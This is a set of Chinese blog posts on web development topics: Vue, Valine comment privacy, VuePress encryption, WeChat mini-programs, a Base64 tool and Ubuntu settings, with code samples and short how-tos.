获取到文件，并解析 前端上传首先需要用户选择文件，先写一个选择文件的 input 和一个上传文件的 button。 vue template12&lt;input type=&quot;file&quot; value=&quot;&quot; ref=&quot;inputFile&quot; /&gt;&lt;button @click=&quot;uploadFile&quot; :disabled=&quot;loading&quot;&gt;开始导入&lt;/button&gt; 再编写上传的方法。 vue script1234567891011121314151617181920212223242526// 获取用户选择的文件const filePath = this.$refs.inputFile.files[0]if (!filePath) { alert('未选择文件') return}try { const result = await this.$tcb.app.uploadFile({ // 由于上传的文件是公有读的，所以并不安全 // 通过使用毫秒时间戳作为文件名，一定程度防止其他用户猜测并下载文件 // 适用于并发不大的场景 cloudPath: `import/${Date.now()}`, filePath, onUploadProgress: (progressEvent) =&gt; { // 通过 SDK 可以获取到上传进度 const percentCompleted = Math.round((progressEvent.loaded * 100) / progressEvent.total) console.log(`已上传 ${percentCompleted}%`) } }) // 获得到上传的 fileID console.log(`上传完成 ${result.fileID}`) // 调用云函数，传递 fileID 给云函数，具体实现略 await importFile(result.fileID)} catch (e) { console.error(e)} 这样一个上传功能就完成了。但我们还需要服务器获取到上传的文件，怎样获得呢？ 云函数下载云函数1234567891011121314// 通过接收到的 fileID 读取云存储中的文件async function readFile (fileId, type, log) { try { const result = await app.downloadFile({ fileID: fileId }) console.log('文件下载成功') const content = result.fileContent.toString('utf8') console.log('文件读取成功') // 删除读取完成的文件，保证不因为公有读而泄露 await app.deleteFile({ fileList: [fileId] }) return content } catch (e) { console.log(`评论文件读取失败：${e.message}`) }} 好了，云函数已经成功取得前端上传的文件内容了，接下来就可以实现导入逻辑了。 本文仅摘部分关键代码解读，完整代码可在 Twikoo 中参考 前端：https://github.com/imaegoo/twikoo/blob/0.3.2/src/view/components/TkAdminImport.vue 云函数：https://github.com/imaegoo/twikoo/blob/0.3.2/src/function/twikoo/index.js#L392 最终实现了下图所示的导入功能（故意上传了一个错误的文件）","link":"/2020/tcb-functions-upload/"},{"title":"Valine 升级 1.4 以及增加判断 “昵称和邮箱不能为空”","text":"如果你和我一样只是想在 1.3.10 原版的基础上增加昵称和邮箱的防空验证，可以直接下划到结尾部分，跳过前半部分的过程记录。 最近经受匿名评论的困扰，计划禁止匿名评论。还有一个原因是《网信办：网站不得向未实名认证的用户提供跟帖评论服务》，咱小小博客也是备过案的（能用国内 CDN 加速太香了），应该注意一下是不是？ 很遗憾，Valine 作者不计划添加这一功能！这让我一度想要换评论系统了……先不谈数据转移，我对比了一下其他评论系统—— Discuz 系，国内连通率堪忧，不行； 基于 GitHub Issue 的，需要 GitHub 授权，对访客不是很友好，国内速度也不快，不行； 还有国内的畅言，要备案好说，但是 UI 不好看，还要验证访客手机号、绑定微信一大堆，麻烦不说，重要的是泄露访客隐私，不行…… 昨天发现 Valine 1.4 发布，有几个新特性挺喜欢，打算升级，想起这茬，干脆一起把防空校验加上吧！ xCss/Valine/src/index.js123456789101112131415161718const requiredField = ['nick', 'mail'];let emptyFieldName = [];requiredField.forEach((requiredField) =&gt; { if (defaultComment[requiredField] == '') { emptyFieldName.push(root.locale['head'][requiredField]); }});if (emptyFieldName.length &gt; 0) { root.alert.show({ type: 0, // 昵称不能为空...ヾ(๑╹◡╹)ﾉ&quot; // 邮箱不能为空...ヾ(๑╹◡╹)ﾉ&quot; // 昵称和邮箱不能为空...ヾ(๑╹◡╹)ﾉ&quot; text: `${emptyFieldName.join(root.locale['tips']['and'])}${root.locale['tips']['canNotBeEmpty']}ヾ(๑╹◡╹)ﾉ&quot;`, ctxt: root.locale['ctrl']['ok'] }); return;} 这只是关键部分，完整 diff 详见：https://github.com/imaegoo/Valine/commit/c18515593f16454833c757c91540ef5af0770fa5 后台验证暂时没研究出，LeanCloud 支持字段设置 “不能为空”，但依然不能阻止插入空字符串，文档中还没查到怎么给字符串验证。 写完了编译试一下，就掉进坑里了，Valine 1.4.4 版本通过源码 build 出的 js 报错 Cannot redefine property: applicationId，需要看看作者怎么说。 无奈切回 1.3.10，加上自己的代码，测试一下，成功！ 测通之后已经 26:30 了，教程晚会再写吧，目前还有后台验证和 1.4 升级的坑没有解决，如果你喜欢，欢迎留言，教程更新后我会邮件告知 o(￣▽￣)ブ 2020/4/12 17:20 更新遗憾地，@MHuiG 告知我 1.4.4 并没有开源。同日，作者也在 README 中提到： 由于某些原因，src目录将从v1.4.0后暂停更新.For some reason, the src directory will be suspended from updating after v1.4.0. 所以暂时放弃升级 1.4 的计划，也就不再对 1.4 增加判空功能了。 我修改过的 Valine 在 Github 开源：https://github.com/imaegoo/Valine/tree/imaegoo/1.3.10 2020/4/14 08:20 更新使用方法如果你用的是 Icarus 3.0 主题，你可以创建 themes/icarus/layout/comment/valine.jsx 来覆盖原版主题的 Valine 组件。 点击展开 themes/icarus/layout/comment/valine.jsx >folded123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121/** * Valine comment JSX component. * @module view/comment/valine * @author ppoffice */const { Component, Fragment } = require('inferno');const { cacheComponent } = require('hexo-component-inferno/lib/util/cache');/** * Valine comment JSX component. * * @see https://valine.js.org/quickstart.html * @example * &lt;Valine * appId=&quot;******&quot; * appKey=&quot;******&quot; * notify={false} * verify={false} * placeholder=&quot;******&quot; * avatar=&quot;mm&quot; * avatarForce={false} * meta={['nick', 'mail', 'link']} * pageSize={10} * visitor={false} * highlight={true} * recordIp={false} * jsUrl=&quot;/path/to/Valine.js&quot; /&gt; */class Valine extends Component { render() { const { appId, appKey, notify, verify, placeholder, avatar = 'mm', avatarForce = false, meta = ['nick', 'mail', 'link'], pageSize = 10, visitor = false, highlight = true, recordIp = false, jsUrl } = this.props; if (!appId || !appKey) { return &lt;div class=&quot;notification is-danger&quot;&gt; You forgot to set the &lt;code&gt;app_id&lt;/code&gt; or &lt;code&gt;app_key&lt;/code&gt; for Valine. Please set it in &lt;code&gt;_config.yml&lt;/code&gt;. &lt;/div&gt;; } const js = `new Valine({ el: '#valine-thread' , notify: ${notify}, verify: ${verify}, appId: '${appId}', appKey: '${appKey}', placeholder: '${placeholder}', avatar: '${avatar}', avatarForce: ${avatarForce}, meta: ${JSON.stringify(meta)}, pageSize: ${pageSize}, visitor: ${visitor}, highlight: ${highlight}, recordIP: ${recordIp} });`; return &lt;Fragment&gt; &lt;div id=&quot;valine-thread&quot; class=&quot;content&quot;&gt;&lt;/div&gt; &lt;script src=&quot;//cdn1.lncld.net/static/js/3.0.4/av-min.js&quot;&gt;&lt;/script&gt; &lt;script src={jsUrl}&gt;&lt;/script&gt; &lt;script dangerouslySetInnerHTML={{ __html: js }}&gt;&lt;/script&gt; &lt;/Fragment&gt;; }}/** * Cacheable Valine comment JSX component. * &lt;p&gt; * This class is supposed to be used in combination with the &lt;code&gt;locals&lt;/code&gt; hexo filter * ({@link module:hexo/filter/locals}). * * @see module:util/cache.cacheComponent * @example * &lt;Valine.Cacheable * comment={{ * app_id=&quot;******&quot; * app_key=&quot;******&quot; * notify={false} * verify={false} * placeholder=&quot;******&quot; * avatar=&quot;mm&quot; * avatar_force={false} * meta={['nick', 'mail', 'link']} * page_size={10} * visitor={false} * highlight={true} * record_ip={false} * }} * helper={{ cdn: function() {...} }} /&gt; */Valine.Cacheable = cacheComponent(Valine, 'comment.valine', props =&gt; { const { comment, helper } = props; return { appId: comment.app_id, appKey: comment.app_key, notify: comment.notify, verify: comment.verify, placeholder: comment.placeholder, avatar: comment.avatar, avatarForce: comment.avatar_force, meta: comment.meta, pageSize: comment.page_size, visitor: comment.visitor, highlight: comment.highlight, recordIp: comment.record_ip, jsUrl: 'https://cdn.jsdelivr.net/gh/imaegoo/Valine@1.3.10.1/dist/Valine.min.js' };});module.exports = Valine; 如果你用的是其他主题，你可以自己查找 Valine.min.js 的引入位置，替换成：https://cdn.jsdelivr.net/gh/imaegoo/Valine@1.3.10.1/dist/Valine.min.js 拓展阅读 Valine 1.4.6+ 新增必填项设置 - https://valine.js.org/configuration.html#requiredFields pure主题valine留言板添加：昵称、邮箱必填必写功能 - https://blog.gobyte.cn/post/e56fdb88.html","link":"/2020/valine-nick-mail-required/"},{"title":"Valine 1.4 如何保护评论者的邮箱和 IP","text":"前言AyagawaSeirin 提出了一个 Valine 隐私安全漏洞，发送请求中响应内容明文暴露评论者IP、邮箱等隐私内容，所以我就去查了一下 LeanCloud 文档，发现可以手动更改字段权限，但是，如果设置 mail 客户端不可见，将不会显示评论者的 Gravatar，转为显示默认头像，因为原版是取到明文邮箱后再转 MD5 取头像的。想到的解决办法是新增一个可见字段存储 mail 的 MD5，需要改 Valine 源码，还需要处理现有数据。 以下是我实现的魔改版本，基于 Valine.min.js 版本 1.4.14 修改。该魔改版新增一个可见字段（mailMd5）存储 mail 的 MD5，并提供了脚本处理现有评论数据。 Github 用法 访问 LeanCloud 控制台 &gt; 存储 &gt; 结构化数据 选择 Comment Class，分别点击 mail 和 ip 相应字段的下拉菜单，选择编辑 勾选”客户端不可见”后，客户端发起查询的时候，返回的结果将不包含这个字段* 即使用 AppKey 指定字段名查询，也不会返回字段值，足够安全。 请同样确认 class 的权限配置 克隆本仓库 12345# 克隆git clone -b imaegoo/1.4.14 https://github.com/imaegoo/Valine.git valinecd valine# 安装依赖npm install 打开 migrate.js，修改里面的 appId，appKey，masterKey，serverURL 为自己的 执行脚本 1node migrate.js 替换博客的 Valine.min.js 为本仓库到 valine.js，可以使用 CDN 地址：https://cdn.jsdelivr.net/npm/@imaegoo/valine@1.4.1-4.1/valine.min.js 测试一下，头像是否正常加载，API 是否没有返回 mail 和 ip 改动如果你对魔改版感到不放心，可以检查检查我都改了些啥","link":"/2020/valine-private/"},{"title":"多种方式解决 Windows CMD 中 vue-cli-service 不是内部或外部命令","text":"前提已安装 Vue 脚手架 1npm install -g @vue/cli 现象找不到 vue-cli-service 命令 1'vue-cli-service' is not recognized as an internal or external command, operable program or batch file. 经过搜索，发现这个问题只在 Windows 下存在。 装了脚手架应该会在 node 目录产生 vue-cli-service.cmd 的文件，实际没有产生，不过在全局 node_modules 下是有的。 有说清理 node_modules 重新安装可以解决的，试了不管用，全局卸载脚手架重新安装也不管用，就算管用也比较麻烦，于是我找到了几个间接使用方法—— 方法1 - npm run在 package.json 中配置启动命令 package.json12345{ &quot;scripts&quot;: { &quot;serve&quot;: &quot;vue-cli-service serve&quot; }} 然后使用 npm run serve 来代替 vue-cli-service serve 方法2 - npx命令前加 npx，如 12npx vue-cli-service servenpx vue-cli-service test:unit 更多关于 npx 介绍见——https://www.ruanyifeng.com/blog/2019/02/npx.html 方法3 - vue ui 启动图形界面1vue ui 访问 http://localhost:8000/ 选择项目文件夹，点任务 - 运行","link":"/2020/vue-cli-service-is-not-recognized/"},{"title":"Vue 给 i18n 国际化组件写单元测试报 $t is not a function","text":"对一个有国际化的 Vue 组件写单元测试，mount这个组件时，会遇到找不到 $t 的报错。 Component template1&lt;p&gt;{{ $t('message.hello' }}&lt;/p&gt; 1TypeError: _vm.$t is not a function Vue 节点上没有 $t，先尝试挂载？ Component.spec.js12import VueI18n from 'vue-i18n'Vue.use(VueI18n) 结果会遇到另一个相似的错误。 1TypeError: Cannot read property '_t' of undefined 我们的 Test Case 不需要测到国际化字符串，那就 mock 一个 $t 好了。 Component.spec.js12345shallowMount(Component, { methods: { $t: () =&gt; '' }}) 测试就通过了。 相关插件版本号： package.json12345678{ &quot;dependencies&quot;: { &quot;vue-i18n&quot;: &quot;^8.14.1&quot; }, &quot;devDependencies&quot;: { &quot;@vue/cli-plugin-unit-jest&quot;: &quot;^4.1.2&quot;, }}","link":"/2020/vue-i18n-unit-test/"},{"title":"Vue.js 做一个大屏幕抽奖","text":"在 Github 上面搜索 “lottery”，发现类似的项目挺多的，有 Electron 实现的，可以打包成 exe，也有原生 js 实现的，浏览器打开。 这次是用 Vue 做了一个编号抽奖，一个转盘抽奖，放在一起，练手。 预览：http://lottery.imaegoo.com/ 编号抽奖编号抽奖实现起来非常简单，存一个号码池，存一个抽奖历史，从号码池中过滤掉已中奖的号码，从剩下的号码随机出一个就可以了。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384&lt;template&gt; &lt;div class=&quot;lottery&quot;&gt; &lt;div class=&quot;current&quot;&gt;{{ current }}&lt;/div&gt; &lt;button class=&quot;button is-large is-warning&quot; v-if=&quot;!timer&quot; @click=&quot;start&quot;&gt;开始&lt;/button&gt; &lt;button class=&quot;button is-large is-danger&quot; v-if=&quot;timer&quot; @click=&quot;stop&quot;&gt;停&lt;/button&gt; &lt;table class=&quot;table&quot; v-if=&quot;history.length &gt; 0&quot;&gt; &lt;thead&gt; &lt;tr&gt; &lt;th&gt;轮次&lt;/th&gt; &lt;th&gt;中奖号码&lt;/th&gt; &lt;/tr&gt; &lt;/thead&gt; &lt;tbody&gt; &lt;tr v-for=&quot;(item, index) in history&quot; :key=&quot;index&quot;&gt; &lt;td&gt;{{ index + 1 }}&lt;/td&gt; &lt;td&gt;{{ item }}&lt;/td&gt; &lt;/tr&gt; &lt;/tbody&gt; &lt;/table&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default { data () { return { numbers: [], current: '', timer: null, history: [] } }, computed: { neverWin () { return this.numbers.filter((item) =&gt; !this.history.some((historyItem) =&gt; historyItem === item)) } }, methods: { random (minNum, maxNum) { return parseInt(Math.random() * (maxNum - minNum + 1) + minNum) }, start () { if (this.neverWin.length &lt; 1) { alert('所有人都已中过奖! 请到设置清空中奖纪录!') return } this.timer = setInterval(this.refresh, 100) }, stop () { clearInterval(this.timer) this.timer = null this.saveHistory() }, refresh () { let next do { next = this.neverWin[this.random(0, this.neverWin.length - 1)] } while (this.current === next) // 避免同数值被连续刷到 this.current = next }, saveHistory () { this.history.push(this.current) localStorage.setItem('history', JSON.stringify(this.history)) }, readNumbers () { const numStr = localStorage.getItem(&quot;numbers&quot;) if (numStr) this.numbers = numStr.split('\\n').filter((item) =&gt; !!item) if (this.numbers.length === 0) { alert('抽奖池为空! 请到右上角设置中添加!') this.numbers = ['11', '22', '33', '44', '55', '66', '77', '88', '99'] } }, readHistory () { const history = localStorage.getItem(&quot;history&quot;) if (history) this.history = JSON.parse(history) } }, mounted () { this.readNumbers() this.readHistory() this.current = this.numbers[0].split('').map(() =&gt; '*').join('') }}&lt;/script&gt; 转盘抽奖转盘抽奖稍微复杂一点： 随机抽一个目标奖项 计算得出到这个奖项的转动角度（这里的角度我也是在区间中随机取，看上去更真实） 加上（360° × 转多少圈） 绑定到转盘图片的 transform 上 设置旋转动画 transition: transform 5s; 做完之后发现也不是很难。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596&lt;template&gt; &lt;div class=&quot;rotate&quot;&gt; &lt;div class=&quot;arrow&quot;&gt; &lt;img class=&quot;wheel&quot; src=&quot;../assets/wheel.png&quot; :style=&quot;{transform: `rotate(${currentAngle}deg)`}&quot; /&gt; &lt;div class=&quot;pointer&quot; @click=&quot;startArrow&quot;&gt;&lt;/div&gt; &lt;/div&gt; &lt;div class=&quot;text&quot; v-if=&quot;currentAward&quot;&gt;{{ currentAward }}&lt;/div&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt;const awards = [ '侯校长发红包', // 30% '工作日不扣工资，休息一天', // 10% '与黄书记共进晚餐', // 10% '工作日不扣工资，休息半天', // 10% '教研组最美（最帅）的人请喝奶茶', // 15% '跟校长们合张影' // 25%]export default { props: { msg: String }, data() { return { currentAngle: 0, times: 0, currentAward: '等待抽奖' } }, methods: { startArrow() { if (this.currentAward === '正在抽奖') return let award = this.getAward() this.getAngle(award) this.setCurrentAward(award) }, getAward() { let randomNum = Math.random() if (randomNum &lt; 0.3) { return 0 } else if (randomNum &lt; 0.4) { return 1 } else if (randomNum &lt; 0.5) { return 2 } else if (randomNum &lt; 0.6) { return 3 } else if (randomNum &lt; 0.75) { return 4 } else if (randomNum &lt;= 1) { return 5 } }, getAngle(award) { this.times++ let max = (award + 1) * 60 let min = award * 60 let angle = parseInt(Math.random() * (max - min + 1) + min, 10) this.currentAngle = 360 * (this.times * 7) + angle }, setCurrentAward(award) { this.currentAward = '正在抽奖' setTimeout(() =&gt; { this.currentAward = `恭喜中奖：${awards[award]}` }, 5000) } }}&lt;/script&gt;&lt;style scoped&gt;.arrow { position: relative;}.wheel { transition: transform 5s;}.pointer { background-repeat: no-repeat; background-position: center; background-image: url('../assets/arrow.png'); content: ''; top: 0; left: 0; right: 0; bottom: 0; position: absolute;}.text { margin-top: 20px; font-size: 26px; font-weight: bold;}&lt;/style&gt; 指针 arrow.png 和转盘 wheel.png 两张图片可以在 https://github.com/imaegoo/lottery/tree/zhengzhou/src/assets 找到。 路由反正只有4个页面，直接自己写一个 tab 切换，没有引入 vue-router。 UI框架功能太简单也用不到，只用了一个 Bulma。啊~ 轻量又好用的 Bulma~ 总结源码放在了 https://github.com/imaegoo/lottery 上面。 设计、切图、编码、测试总共花了6小时，嗯，挺简单的。","link":"/2020/vue-lottery/"},{"title":"Vue Router 向 URL query 添加、删除参数","text":"添加一个参数当前 URL：http://localhost/home?keyword=example 1this.$router.replace({ query: { ...this.$route.query, code: '1' } }) 最终 URL：http://localhost/home?keyword=example&amp;code=1 删除一个参数我所使用的 Vue Router 版本为 3.0.3，删除参数比较麻烦。 当前 URL：http://localhost/home?keyword=example&amp;code=1 无效方法12delete this.$route.query.codethis.$router.replace({ query: this.$route.query }) // 地址栏无反应 有效方法1234let newQuery = JSON.parse(JSON.stringify(this.$route.query)) // 深拷贝delete newQuery.code// 如果有引入 lodash, 可以写成: let newQuery = _.omit(this.$route.query, 'code')this.$router.replace({ query: newQuery }) 最终 URL：http://localhost/home?keyword=example 后记使用 this.$router.replace() 以及 this.$router.push() 时，地址栏变化是有延后的，且这个延后无法通过 this.$nextTick() 预测。 以下场景：微信 OAuth 回跳到我们的页面时，会在 URL 追加 code 参数用于认证，我们成功获得 code 后想要从地址栏去掉它，同时还要配置微信 JS SDK。配置微信 JS SDK 需要当前页面地址（window.location.href.split('#')[0]），而我们去掉 code 会导致地址改变。地址栏实际改变完成的时间是不可预测的，而配置微信 JS SDK 有成功回调，所以需要先配置微信 JS SDK，再处理地址栏。 参考资料：https://stackoverflow.com/questions/48700584/vuejs-how-to-remove-parameter-from-url","link":"/2020/vue-remove-query-from-router/"},{"title":"VuePress 自定义默认主题页眉页脚","text":"方式添加 2 个文件 .vuepress/theme/index.js123module.exports = { extend: '@vuepress/theme-default'} .vuepress/theme/layouts/Layout.vue123456789101112131415161718192021222324252627&lt;template&gt; &lt;ParentLayout&gt; &lt;template #sidebar-top&gt; &lt;div&gt;My custom sidebar-top&lt;/div&gt; &lt;/template&gt; &lt;template #sidebar-bottom&gt; &lt;div&gt;My custom sidebar-bottom&lt;/div&gt; &lt;/template&gt; &lt;template #page-top&gt; &lt;div&gt;My custom page-top&lt;/div&gt; &lt;/template&gt; &lt;template #page-bottom&gt; &lt;div&gt;My custom page-bottom&lt;/div&gt; &lt;/template&gt; &lt;/ParentLayout&gt;&lt;/template&gt;&lt;script&gt;import ParentLayout from '@parent-theme/layouts/Layout.vue'export default { name: 'Layout', components: { ParentLayout }}&lt;/script&gt; 效果 适用版本vuepress v1.5.4 Global Footer in Default Theme #339","link":"/2020/vuepress-default-theme-slot/"},{"title":"VuePress 密码加密文章","text":"前言事情的起因是，我需要一个存放未分类整理知识点，以及收藏转载文章的私人知识库，和 iMaeGoo’s Blog 区别开来。 我尝试过简书、语雀、Evernote、OneNote、有道云笔记，对它们的 markdown 支持、导出能力、搜索能力、容量、安全性都有体会。 最后我决定建一个私人 Git 仓库，用 markdown 来记笔记。然后通过 CI/CD 自动构建到一个叫 iMaeGoo’s Diary 的 VuePress 网站。写笔记 Notepad + Git 就能搞定，还能自由选择多种多样的 markdown 编辑器，手机端也可以通过在线 IDE 更新内容，VuePress 的搜索非常好用，安全性也完全在自己的掌控范围之内。 反正是知识库嘛，我配置了完全公开，方便自己随时随地查看，但由于是未经整理的知识库，也不建议访客去看啦。 问题就来了，有些笔记包含了敏感信息，怎么在公开的知识库中保护这类信息？ 在寻找 VuePress 加密时，我发现了 vuepress-plugin-encrypt 这个好用的插件，使用了 aes-128-ctr 来加密内容，你可以直接查看它的英文官方文档。 效果 开始使用 在 VuePress 的项目中安装这个插件command1yarn add -D @oak-tree-house/vuepress-plugin-encrypt 修改配置文件启用插件.vuepress/config.js12345module.exports = { plugins: [ ['@oak-tree-house/encrypt'] ]} 修改 package.json 增加加解密的命令package.json123456{ &quot;scripts&quot;: { &quot;decrypt&quot;: &quot;encrypt decrypt --source-dir &lt;YOUR_SOURCE_DIR&gt; --key-file keys.json --temp .temp-encrypt&quot;, &quot;encrypt&quot;: &quot;encrypt encrypt --source-dir &lt;YOUR_SOURCE_DIR&gt; --key-file keys.json --temp .temp-encrypt&quot; }} * 此处基于官方 doc 有改动，命令参数 encrypt 和 decrypt 需要放在最前，否则会遇到错误 error: unknown option '--source-dir' 把临时目录添加到 .gitignore 列表.gitignore12/keys.json/.temp-encrypt * 如果你的是安全的私有 Git 仓库，想一起提交密码文件，可以不 ignore /keys.json 新建密码文件 keys.jsonkeys.json123456{ &quot;user&quot;: &quot;imaegoo&quot;, &quot;keys&quot;: { &quot;key&quot;: &quot;mypassword&quot; }} 尝试写一段需要加密的内容markdown1234## test::: encrypt key=key owners=imaegoomy password is helloworld::: 运行 yarn encrypt，你将会发现上一步的内容被自动替换成密文markdown12345## test::: encrypt encrypted key=key owners=imaegooZpDkUuyB2+O7/Ga9InossDwIYJVn3I6VbdlNLxiJaU/gCDxnC1kQcgbzC9RqVCZ3ru6fpf3B5wnjKKSR1/miaLoxP4WrCnlYTiL0AeAeLPW0bN+3KqBg2n+fTCqubEFfRZnbKUGvsuZai0vRSW4OYmirew**::: 大功告成，运行 VuePress 开发模式，测试一下吧！ 配置最新的完整配置参见官方文档 .vuepress/config.js123456789101112131415module.exports = { plugins: [ ['@oak-tree-house/encrypt', { contentTitle: 'Encrypted Content', unencryptedText: 'The content is shown below. It should be encrypted when published.', encryptedText: 'This part of content is encrypted. To view it, you need to enter the correct key in the input field below.', decryptedText: 'The encrypted content is successfully decrypted and shown below.', decryptButtonText: 'Decrypt', decryptFailText: 'Failed to decrypt!', unencryptedIcon: undefined, encryptedIcon: undefined, decryptedIcon: undefined }] ]} 本文部分内容来自 https://szp15.com/2020/02/04/plugin-encrypt-doc/，采用 MIT License","link":"/2020/vuepress-encrypt/"},{"title":"无需开发&#x2F;体验权限，获取任意微信小程序卡片页面路径","text":"背景工作上正在开发的一款小程序，需要链接到京东购物的一个活动页面。经过搜索发现，除了在小程序内嵌 Webview，小程序内不能直接跳转一个网页，但是京东也是有自己的小程序的，我们可以跳转到京东的小程序吗？查找文档发现可以用 wx.navigateToMiniProgram 打开另一个小程序。 1234wx.navigateToMiniProgram({ appId: '', // 要打开的小程序 appId path: '' // 打开的页面路径，如果为空则打开首页}) 现在需要的就是京东小程序的 appId 和活动页面的 path 了！ 一番操作后，我发现微信 APP 上既不能获取到小程序的 appId 也不能获取到活动页面的 path，若要获得这两样东西，得开启调试才行，想开启调试，至少要成为小程序开发者…… 京东小程序的开发者，我怎么可能拿得到嘛，我连他们的开发者都接触不到！ 前提小程序页面至少是可分享的，如果是配置成完全不可分享的小程序，此方法不可用。 方法拿“抽奖助手”小程序做例子吧。 打开微信网页版； 登录后，打开 F12 网页调试，到 Network 标签下； 在手机端将小程序分享给任意好友； 在 Network 标签下会看到 POST https://wx.qq.com/cgi-bin/mmwebwx-bin/webwxsync 的请求； 查看 response 是一个 JSON 字符串； 展开到 AddMsgList[0].Content，看到一个转义的 XML 字符串； 解码后，得到原始消息 XML； 查找 &lt;weappinfo&gt;，找到类似下面的这一段数据；123456789101112131415&lt;weappinfo&gt; &lt;pagepath&gt;&lt;![CDATA[pages/lucky/lottery/detail.html?id=80018XBB8Mn&amp;home=1]]&gt;&lt;/pagepath&gt; &lt;username&gt;&lt;/username&gt; &lt;appid&gt;wx01bb1ef166cd3f4e&lt;/appid&gt; &lt;version&gt;732&lt;/version&gt; &lt;type&gt;2&lt;/type&gt; &lt;weappiconurl&gt;&lt;![CDATA[http://wx.qlogo.cn/mmhead/Q3auHgzwzM6pjwC2de3qEMiaIunrq5WWEdFWlaYBYvhoQPVEA1SfaBw/96]]&gt;&lt;/weappiconurl&gt; &lt;shareId&gt;&lt;![CDATA[1_wx01bb1ef166cd3f4e_bd399ef25a9defc93c73fb3cacacacd3_1600911693_0]]&gt;&lt;/shareId&gt; &lt;appservicetype&gt;0&lt;/appservicetype&gt; &lt;videopageinfo&gt; &lt;thumbwidth&gt;720&lt;/thumbwidth&gt; &lt;thumbheight&gt;576&lt;/thumbheight&gt; &lt;fromopensdk&gt;0&lt;/fromopensdk&gt; &lt;/videopageinfo&gt;&lt;/weappinfo&gt; 其中“wx01bb1ef166cd3f4e”即为我们要找的 appId其中“pages/lucky/lottery/detail.html?id=80018XBB8Mn&amp;home=1”删除里面的 .html 后，即为我们要找的 path","link":"/2020/weixin-miniprogram-get-path/"},{"title":"解决微信小程序在 iPhone iOS 上 text 宽度只有一半导致的不居中等种种问题","text":"现象当小程序中使用第三方字体时，在 iPhone 11 和 iPhone 12 机型下 中文字正常 英文字和数字，居中和右对齐异常 这个问题只能在几个特定的机型下出现，不用第三方字体也没有这个问题，安卓机型和开发者工具也重现不了，甚至 iPhone 12 mini 用同一版本也不能重现。 微信版本：7.0.18小程序基础库：2.14.0iOS：14.2 这未免也太奇怪了。 代码代码片段地址：https://developers.weixin.qq.com/s/wgOVEgmQ7Cmz wxml123456789101112&lt;view class=&quot;page&quot; wx-if=&quot;{{ ready }}&quot;&gt; &lt;view class=&quot;text-left&quot;&gt;左对齐文本&lt;/view&gt; &lt;view class=&quot;text-center&quot;&gt;居中文本&lt;/view&gt; &lt;view class=&quot;text-right&quot;&gt;右对齐文本&lt;/view&gt; &lt;view class=&quot;text-left&quot;&gt;Left&lt;/view&gt; &lt;view class=&quot;text-center&quot;&gt;Center&lt;/view&gt; &lt;view class=&quot;text-right&quot;&gt;Right&lt;/view&gt; &lt;view class=&quot;text-left&quot;&gt;123&lt;/view&gt; &lt;view class=&quot;text-center&quot;&gt;456&lt;/view&gt; &lt;view class=&quot;text-right&quot;&gt;789&lt;/view&gt; &lt;view class=&quot;center-line&quot;&gt;&lt;/view&gt;&lt;/view&gt; js12345678910111213141516Page({ data: { ready: false }, onLoad () { wx.loadFontFace({ global: true, family: 'FZZhunYuan-M02S', source: 'url(&quot;http://localhost:9000/FZZhunYuan.ttf&quot;)', complete: (res) =&gt; { console.log('loading font status: ' + res.status) this.setData({ ready: true }) } }) }}) wxss123456789101112131415161718192021222324252627282930.page { display: flex; flex-direction: column; font-family: 'FZZhunYuan-M02S';}.center-line { position: absolute; left: 50vw; width: 1px; height: 100vh; background-color: #ff0000;}.text-left,.text-center,.text-right { width: 80%; display: flex; background-color: #cccccc; margin: 20rpx auto; font-size: 50rpx;}.text-left { justify-content: flex-start;}.text-center { justify-content: center;}.text-right { justify-content: flex-end;} 分析使用微信开发者工具真机调试功能，发现 text 的宽度只有正常的一半宽度，尝试设置 text 的宽度，因为 text 属于 inline 元素，所以没有效果…… 于是乎，想到既然中文字正常，那我们只要在英文字中加入中文字符，是不是能解决问题呢？ 解决办法如果想让文字居中，就在文字左右各加一个全角空格“ ”如果想让文字右对齐，就在文字右边加一个全角空格“ ” 其实就是，只要让文本不全是英文和数字，就不会出现问题。 (⊙﹏⊙)……说是解决办法，其实是一个 workaround，等着官方修复吧…… 社区相应的 bug：https://developers.weixin.qq.com/community/develop/doc/0006cc3bd7056063605b97a2353c00","link":"/2020/weixin-miniprogram-ios-text-width-bug/"},{"title":"Base64 在线文本加解密工具","text":"Base64 在线加解密工具，纯前端。 之所以写这个是因为网上的同类工具要么离不开后端操作，要么广告一堆，用着不顺手。 简单一点。 输入文本 加密 解密 加密 / 解密结果 function encrypt (decrypt, event) { var base64req = $('#text-plain').val(); var base64res; try { if (decrypt) { base64res = decodeuint8arr(base64js.toByteArray(base64req)); } else { base64res = base64js.fromByteArray(encodeuint8arr(base64req)); } } catch (e) { base64res = e.message; } $('#text-encrypted').val(base64res); } function decodeuint8arr (uint8array) { return new TextDecoder('utf-8').decode(uint8array); } function encodeuint8arr (myString) { return new TextEncoder('utf-8').encode(myString); } 相关代码12345678910111213141516171819202122// &lt;script src=&quot;https://cdn.jsdelivr.net/npm/base64-js@1.5.1/base64js.min.js&quot;&gt;&lt;/script&gt;function encrypt (decrypt, event) { var base64req = $('#text-plain').val(); var base64res; try { if (decrypt) { base64res = decodeuint8arr(base64js.toByteArray(base64req)); } else { base64res = base64js.fromByteArray(encodeuint8arr(base64req)); } } catch (e) { base64res = e.message; } $('#text-encrypted').val(base64res);}function decodeuint8arr (uint8array) { return new TextDecoder('utf-8').decode(uint8array);}function encodeuint8arr (myString) { return new TextEncoder('utf-8').encode(myString);}","link":"/2021/base64-tool/"},{"title":"关闭 Ubuntu 20 桌面版动画，使应用程序菜单不再卡顿","text":"Ubuntu Desktop 应用程序菜单带有从屏幕底角到屏幕中心的动画。虽然这看起来很酷，但我感觉它很卡，优化很差，尤其是在集成显卡和虚拟机的环境中。如果你的想法和我一样，有一种方法可以关闭此动画，从而可以更快地从“应用程序”菜单中启动应用程序。 打开“终端” 执行以下命令，关闭动画，立即生效1gsettings set org.gnome.desktop.interface enable-animations false 想要重新开启动画，只需要执行 1gsettings set org.gnome.desktop.interface enable-animations true 看看百度的答案都是些啥，还需要安装 